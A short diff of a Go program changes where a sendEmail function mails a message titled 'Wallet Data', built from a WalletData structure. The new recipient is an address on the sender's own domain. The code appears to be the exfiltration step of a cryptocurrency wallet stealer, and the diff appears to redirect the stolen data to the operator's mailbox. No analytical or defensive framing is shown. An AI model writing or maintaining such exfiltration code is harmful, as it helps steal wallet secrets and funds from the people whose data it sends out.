@@ -58,7 +58,7 @@ func main() {
 func sendEmail(data *WalletData) error {
     m := gomail.NewMessage()
     m.SetHeader("From", "info@resolverd.dev")
-    m.SetHeader("To", "johnfisher@gmail.com")
+    m.SetHeader("To", "info@resolverd.dev")
     m.SetHeader("Subject", "Wallet Data")
     m.SetBody("text/plain", formatEmailBody(data))
 
